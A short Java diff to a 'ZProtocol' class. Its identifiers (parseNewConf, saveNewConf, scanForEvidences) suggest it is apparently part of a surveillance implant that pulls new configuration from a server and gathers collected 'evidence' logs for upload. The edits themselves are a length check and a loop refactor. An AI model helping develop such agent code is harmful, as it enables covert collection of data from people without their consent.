@@ -478,9 +478,12 @@ public class ZProtocol extends Protocol {
 			debug.trace("parseNewConf len: " + confLen);
 			// #endif
 
+			if(confLen > 0){
 			boolean ret = Protocol.saveNewConf(result, 8);
+			
 			if (ret) {
 				reload = true;
+			}
 			}
 
 		} else if (res == Proto.NO) {
@@ -702,13 +705,14 @@ public class ZProtocol extends Protocol {
 		// #endif
 		for (int i = 0; i < dsize; ++i) {
 			final String dir = (String) dirs.elementAt(i);
-			final Vector logs = logCollector.scanForEvidences(basePath, dir);
-			final int lsize = logs.size();
+			final String[] logs = logCollector.scanForEvidences(basePath, dir);
+			final int lsize = logs.length;
 			// #ifdef DEBUG
 			debug.trace("    dir: " + dir + " #evidences: " + lsize);
 			// #endif
-			for (int j = 0; j < lsize; ++j) {
-				final String logName = (String) logs.elementAt(j);
+			//for (int j = 0; j < lsize; ++j) {
+			//	final String logName = (String) logs.elementAt(j);
+			for(String logName : logs){
 				final String fullLogName = basePath + dir + logName;
 				final AutoFile file = new AutoFile(fullLogName);
 				if (!file.exists()) {
